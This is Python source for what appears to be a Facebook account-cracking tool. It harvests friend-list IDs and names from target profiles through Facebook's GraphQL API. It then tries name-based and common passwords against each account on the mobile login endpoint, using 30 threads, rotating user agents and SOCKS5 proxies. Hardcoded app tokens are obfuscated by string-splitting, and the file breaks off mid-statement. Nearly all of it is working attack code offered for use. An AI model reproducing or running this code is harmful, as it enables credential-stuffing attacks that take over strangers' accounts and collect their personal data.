	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 7.1.2; Redmi 4A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\x1b[38;5;208m' # KUNING +
h = '\x1b[38;5;204m' # HIJAU +
hh = '\x1b[38;5;220m' # HIJAU -
u = '\x1b[38;5;193m' # UNGU
kk = '\x1b[38;5;216m' # KUNING -
b = '\x1b[38;5;190m' # BIRU -
p = '\x1b[38;5;106m' # BIRU +
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
vip = random.choice([a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32,a34,a35,a36,a27,a38,a39,a40,p,b,m,u,x,hh,Z,kk,h,P,O,U,N,H,M,K,B,k])
def back():
	login()
def banner():
	print(f'''{vip}
	██░▀██████████████▀░██
　　█▌▒▒░████████████░▒▒▐█
　　█░▒▒▒░██████████░▒▒▒░█
　　▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐
　　░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
　 ███▀▀▀██▄▒▒▒▒▒▒▒▄██▀▀▀██
　 ██░░░▐█░▀█▒▒▒▒▒█▀░█▌░░░█
　 ▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌
　　█░░░▐█▌░░▌▒▒▒▐░░▐█▌░░█
　　▒▀▄▄▄█▄▄▄▌░▄░▐▄▄▄█▄▄▀▒
　　░░░░░░░░░░└┴┘░░░░░░░░░
　　██▄▄░░░░░░░░░░░░░░▄▄██
　　████████▒▒▒▒▒▒████████
　　█▀░░███▒▒░░▒░░▒▀██████
　　█▒░███▒▒╖░░╥░░╓▒▐█████
　　█▒░▀▀▀░░║░░║░░║░░█████
　　██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███
　　██████████████████████

{m}||=•{k}•={m}{h}<{m}  TOOL VIP    {k}{k}V.1    {b}BY    {b}{m}ᏃᏫᏃᏫ{h}>{m}||{k}=•''')

def login():
	try:
		token = open('.login_ZOZO_token.txt','r').read()
		cok = open('.login_ZOZO_cokies.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!!!]\t ᴇ𝒓𝒓𝒐𝒓 | لا يـوجـد انـتـرنـت')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
		try:
			print('\n')
			em = input(f'{Z}༺ {M}THE ID/EMAIL :{a17} ')
			ps = input(f'{hh}༺ {vip}THE PASSWORD :{a20} ')
			e="5990"
			ee="655"
			eee="59"
			tok1 = f"2377{e}9{eee}1{ee}"
			ei="0f140aabedfb65"
			ei2="a2263b1"
			tok2 = f"25257C{ei}ac27a739ed1{ei2}"
			us = f'Mozilla/5.0 (Linux; Android {str(random.randint(4,11))}.0; Nexus 5 Build/MRA{str(random.randint(30,60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600,1661))}.41'
			br.addheaders = [('User-Agent', us)]
			li = "b-ap"
			lo = "od/auth.l"
			op="3f555f98"
			op2 = "d7aa0c"
			op3="58f522efm"
			sig=f"{op}fb61fc{op2}44f{op3}"
			p = br.open(
		'https://'+li+'i.facebook.com/meth'+lo+'ogin?access_token='+tok1+'%'+tok2+'&format=json&sdk_version=1&email=' + em + '&locale=en_US&password=' + ps + '&sdk=ios&generate_session_cookies=1&sig='+sig+'')
			po = json.load(p)
			if 'access_token' in po:
				toke=po['access_token']
				#print(f' [-] LOGIN DONE RERUN ')
				open('.login_ZOZO_token.txt','w').write(toke)
				see = requests.Session()
				see.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent": us,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				p = see.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
#print(p)
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":em,"flow":"login_no_pin","pass":ps,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				see.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent": us,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
				po = see.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				kie = see.cookies.get_dict()
				if 'xs' and 'c_user' in kie:
					koe = f"datr={kie['datr']};sb={kie['sb']};vpd=v1%3B633x360x2;locale=ar_AR;m_pixel_ratio=2;fr={kie['fr']};c_user={kie['c_user']};xs={kie['xs']};m_page_voice={kie['c_user']};wd=360x633;"
					cokiew = open(".login_ZOZO_cokies.txt", "w").write(koe)
					print(f'\n[✅] LOGIN')

				exit()
			else:
				print('ERROR❌')
				exit()
# MAIN MENU
		except Exception as e:
			print('\n[❌] Cookies Invalid Bro')
			os.system('rm -rf .login_ZOZO_cokies.txt && rm -rf .login_ZOZO_token.txt')
def menu(my_name,my_id):
	try:
		token = open('.login_ZOZO_token.txt','r').read()
		cok = open('.login_ZOZO_cokies.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
#	ip = requests.get("https://api.ipify.org").text
#	print('\x1b[38;5;208m⚜️'*60)
#	print(f'➪ 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 ➪ '+str(my_name))
#	print('\x1b[38;5;208m⚜️'*60)
#	print(f'➪ 𝒚𝒐𝒖𝒓 𝒊𝒅 ➪ '+str(my_id))
#	print('\x1b[38;5;208m⚜️'*60)
#	print(f'➪ 𝒚𝒐𝒖𝒓 𝒊𝒑 ➪ {ip}')
	print('\x1b[38;5;205m⚜️'*60)
	print(f"\x1b[1;91m➪ DATE ➪  \x1b[1;92m{ha}\x1b[1;93m ‖ \x1b[1;94m{bu}\x1b[1;95m ‖ \x1b[1;96m{ta} ")
	print('\x1b[38;5;205m⚜'*60)
	print('')
	print((a27+"["+a27+"1"+a27+"]"+a27+" 𝒇𝒊𝒔𝒉𝒊𝒏𝒈 𝒇𝒓𝒐𝒎 𝒇𝒓𝒊𝒆𝒏𝒅𝒔 |  مـن الأصدقاء  "))
	print((a26+"["+a26+"2"+a26+"]"+a26+" c𝒓𝒂𝒄𝒌 𝒇𝒊𝒍𝒆  |  مـن مـلـف  "))
	#print((k+"["+p+"3"+k+"]"+p+" GET FILE IDS | صـنع مـلـف ايـدي"))
	#print((k+"["+p+"4"+k+"]"+p+" REMOV DUPLIC ID | حـذف الايـديـات الـمـكرره"))
#	print((k+"["+p+"5"+k+"]"+p+" REMOV NUM OF IDS YOU | حـذف عـدد ايـديـات تـحـدده"))
	print((a26+"["+p+"0"+k+"]"+p+" 𝒍𝒐𝒈𝒊𝒏 𝒐𝒖ᴛ |  تـسـجـيـل خـروج"))
	ZOZO = input('\x1b[38;5;205m\n➪ 𝒄𝒉𝒐𝒐𝒔𝒆 | اخـتـار ')
	if ZOZO in ['1']:
		dump_massal()
	elif ZOZO in ['2']:
		F()
	elif ZOZO in ['3']:
		getfile()
	elif ZOZO in ['4']:
		d()
	elif ZOZO in ['5']:
		RE2()	
	elif ZOZO in ['0']:
		os.system('rm -rf .login_ZOZO_token.txt')
		os.system('rm -rf .login_ZOZO_cokies.txt')
		print('\x1b[1;92༺ 𝒈𝒂𝒅 𝒍𝒐𝒈𝒊𝒏 𝒐𝒖ᴛ')
		exit()
	else:
		print('\x1b[1;91༺ ᴇ𝒓𝒓𝒐𝒓 ')
		back()
def RE2():
	ba=input('𝒇𝒊𝒍𝒆 𝒏𝒂𝒎𝒆 ༻')
	numr=input('𝒏𝒖𝒎𝒃𝒆𝒓 𝒐𝒇 𝒍𝒊𝒏𝒆𝒔 ༻')
	with open(ba, "r") as f:
		lines = f.readlines()
		lines = lines[int(numr):]
		with open(ba, "w") as f:
			f.writelines(lines)
			menu()		
def d():
	os.system('clear')
	try:
		ch_x1 = ("y")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			filepath=(f'{nm}')
			newfile = input("[-] Name New File Now Duplicate : ")
			os.system('sort -r '+filepath+' | uniq > '+newfile)
			if 'ouoo'=='oo':
				os.system('rm -rf akakajh')
			else:
				print(47*'-')
				print (f"\x1b[0;37m Your File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
				print(47*'-')
				print('\n')
				input("\n[-] Press Inter to go Back ")
				d()
		else:
				print(47*'-')
				print (f"\x1b[0;37m Total ID :\x1b[1;92m {totaldmp}")
				print (f"\x1b[0;37m Your File Save As :\x1b[1;92m {filepath} ")
				print(47*'-')
				input("\n[>>] Press Inter to go Back < ")
				menu()
	except Exception as e:
		print("[>] Error : %s"%e)
		exit("")		
def F():
	try:
			print('')			
			fileX = input ('\x1b[38;5;205m 𝒇𝒊𝒍𝒆 𝒏𝒂𝒎𝒆 | اسم الملف ')
			print('\n')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			setting()
	except IOError:
			print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
			F()	
def getfile():
	fill= input('\x1b[38;5;205m➪ 𝒇𝒊𝒍𝒆 𝒏𝒂𝒎𝒆 | اسم الملف')
	try:	
		token = open('.login_ZOZO_token.txt','r').read()
		cok = open('.login_ZOZO_cokies.txt','r').read()
	except IOError:
		exit()
	try:
		print('')
		jum = int(input('\x1b[38;5;205m➪ 𝒏𝒖𝒎𝒃𝒆𝒓 𝒊𝒅 | عـدد الـايـديـات : '))
		print('')
	except ValueError:
		print('➪ Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('➪ Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\x1b[38;5;205m➪ ID  '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
	    model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
	    carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&", "MTN", "Cricket"])
	    trace_id = str(uuid.uuid4())
	    side=[]
	    q="968"
	    qq="8280"
	    qqq="52729"
	    qqqq="420"
	    client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"   
	    headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
										   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
										   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
										   "Authorization": "OAuth "+token+"",
										   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
										   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
										   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
										   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
										   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
										   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
										   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
										   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
	    data = {
									'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
									'client_doc_id': client_id,
									'method': 'post',
									'locale': 'en_US',
									'pretty': 'false',
									'format': 'json',
									'variables': '{"profile_id":' + user + ',"suggestion_friends_paginating_first":2500}',
									'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
									'fb_api_caller_class': 'graphservice',
									'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
									'client_trace_id': trace_id,
									'server_timestamps': 'true',
									'purpose': 'fetch'
								}
	    posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
	    try:
	    	data = posted['data']['user']['friends']['edges']
	    	if len(data) < 100:
	    		print(f' [×] PRIVATE FRIENDLIST OF  ')
	    	else:
	    		for edge in data:
	    			node = edge['node']
	    			iso = (node['id']+'|'+node['name'])
	    			print('\n')
	    			vi = random.choice([a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32,a34,a35,a36,a27,a38,a39,a40,p,b,m,u,x,hh,Z,kk,h,P,O,U,N,H,M,K,B,k])
	    			sys.stdout.write(f"\r{vi}𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 : {len(id)}"),sys.stdout.flush()
	    			#print(iso)
	    			os.system('clear')
	    			if iso in id:pass
	    			else:
	    				id.append(iso)
	    				open(fill,'a').write(iso)
	    		print('Done Save in '+str(fill))
	    except (KeyError,IOError):
	    	pass
	    	print('[✘] Error  ')
	    	#exit()
def dump_massal():
	try:	
		token = open('.login_ZOZO_token.txt','r').read()
		cok = open('.login_ZOZO_cokies.txt','r').read()
	except IOError:
		exit()
	try:
		print('')
		jum = int(input('\x1b[38;5;205m ➪ 𝒏𝒖𝒎𝒃𝒆𝒓 𝒊𝒅 | عـدد الـايـديـات : '))
		print('')
	except ValueError:
		print('➪ Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('➪ Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('\x1b[38;5;205m➪ ID  '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
	    model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
	    carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&", "MTN", "Cricket"])
	    trace_id = str(uuid.uuid4())
	    side=[]
	    q="968"
	    qq="8280"
	    qqq="52729"
	    qqqq="420"
	    client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"   
	    headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
										   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
										   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
										   "Authorization": "OAuth "+token+"",
										   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
										   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
										   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
										   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
										   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
										   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
										   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
										   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
	    data = {
									'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
									'client_doc_id': client_id,
									'method': 'post',
									'locale': 'en_US',
									'pretty': 'false',
									'format': 'json',
									'variables': '{"profile_id":' + user + ',"suggestion_friends_paginating_first":2500}',
									'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
									'fb_api_caller_class': 'graphservice',
									'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
									'client_trace_id': trace_id,
									'server_timestamps': 'true',
									'purpose': 'fetch'
								}
	    posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
	    try:
	    	data = posted['data']['user']['friends']['edges']
	    	if len(data) < 100:
	    		print(f' [×] PRIVATE FRIENDLIST OF  ')
	    	else:
	    		for edge in data:
	    			node = edge['node']
	    			iso = (node['id']+'|'+node['name'])
	    			print('\n')
	    			vi = random.choice([a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32,a34,a35,a36,a27,a38,a39,a40,p,b,m,u,x,hh,Z,kk,h,P,O,U,N,H,M,K,B,k])
	    			sys.stdout.write(f"\r{vi}𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 : {len(id)}"),sys.stdout.flush()
	    			#print(iso)
	    			os.system('clear')
	    			if iso in id:pass
	    			else:id.append(iso)
	    except (KeyError,IOError):
	    	pass
	    	print('[✘] Error  ')
	    	#exit()
	try:
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
def setting():
     rr = random.randint
     for ran in id:
            c_id = rr(0,len(id2))
            id2.insert(c_id, ran)
            method.append('mobile')
     passwrd()
def passwrd():
	banner()
	with tred(max_workers=30) as pool:
		for ZOZO in id2:
			idf = ZOZO.split('|')[0]
			nmf = ZOZO.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = [nmf,'11223344',frs+'123',frs+'009988776655',frs+'12345','1122334455','qqwweerr','11223344556677',frs+'0099887766',frs+'00998877',frs+'2006',frs+'aassddff',frs+'zzxxccvv',frs+'20012001',frs+'@@','١٢٣٤٥٦',frs+'1122334455@@','112233445566',frs+'123123@@','١٢٣٤٥٦٧٨٩']
			if 'mobile' in method:
					pool.submit(crack,idf,pwv)
			else:pass
	print('\n')		
	print(f'\t{a16}[✓]انـتـهـى الـصـيـد مطورة الاداة @Q_O_O_Z')
	print(f'[{b}•{x}]{h} 𝒅𝒐𝒏𝒆 𝒂𝒄𝒄𝒐𝒖𝒏ᴛ ༻ {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} 𝒇𝒂𝒍𝒔𝒆 𝒂𝒄𝒄𝒐𝒖𝒏ᴛ ༻ {k}%s{x} '%(cp))
	time.sleep(2)
	print('\x1b[38;5;205m𝒈𝒐𝒐𝒅 𝒃𝒚𝒆 👋')
def crack(idf,pwv):
	global loop,ok,cp
	vip = random.choice([a14,a15,a16,a17,k,H])
	amr=rc(['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️‍🔥','❤️‍🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆','🧑🏻‍💻','✨','🗿','👍🏼','🚬','🐸','👀','🤚🏻','🔪','🤞🏼','✋🏼','🐍','🦉','🦅'])
	print(f'\r%s%s⤹ ᏃᏫᏃᏫ ⤸ %s|%s 𝒐𝒌 : %s 𝒄𝒑 : %s %s'%(amr,vip,loop,len(id2),ok,cp,amr), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua = random.choice(ugent)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', 